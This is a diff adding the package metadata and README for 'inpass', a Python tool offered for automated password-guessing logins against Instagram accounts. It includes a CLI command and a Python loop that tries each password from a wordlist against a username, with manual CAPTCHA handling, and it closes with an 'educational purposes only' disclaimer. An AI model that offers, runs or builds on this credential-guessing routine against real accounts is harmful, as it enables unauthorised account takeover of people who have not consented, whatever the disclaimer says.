@@ -1,0 +1,70 @@
+Metadata-Version: 2.1
+Name: inpass
+Version: 2.0.0
+Summary: Automated login attempts for Instagram.
+Home-page: https://mrfidal.in
+Author: Fidal
+Author-email: mrfidal@proton.me
+Description-Content-Type: text/markdown
+License-File: LICENSE
+
+#  inpass 2.0.0
+
+`inpass` is a Python package designed for automated login attempts on Instagram. This package can help automate the login process using multiple passwords, handle CAPTCHA challenges, and track URL changes during login attempts.
+
+## Features
+
+- Automated login attempts for Instagram.
+- Handles CAPTCHA challenges by pausing and allowing manual resolution.
+- Tracks URL changes during the login process.
+- Command-line interface (CLI) and programmatic usage supported.
+
+## Installation
+
+You can install the package using `pip`:
+
+```bash
+pip install inpass
+```
+
+## Usage
+
+### Command-line Interface
+- You can use the inpass package directly from the command line. Here’s how:
+```bash
+inpass --username your_username --password-file passwords.txt
+```
+
+### Programmatic Usage
+- You can also use the inpass package programmatically in your Python scripts. Below is an example:
+
+```python
+import time
+import inpass
+
+username = "your_username"
+password_file = "passwords.txt"
+
+with open(password_file, 'r') as file:
+    passwords = file.read().splitlines()
+
+for password in passwords:
+    if inpass.login(username, password):
+        print(f"Password match: {password}")
+        break
+    else:
+        print(f"Password {password} not matching")
+    time.sleep(1)
+else:
+    print("All passwords failed.")
+```
+## License
+This project is licensed under the MIT License. See the LICENSE file for details.
+
+### Acknowledgments
+Thank you to all the contributors and users who have supported the development of this project.
+
+#### Disclaimer
+This package is intended for educational and research purposes only. The author is not responsible for any misuse of this software.
+
+- Thank you for using inpass. We hope it helps you automate your login attempts efficiently.
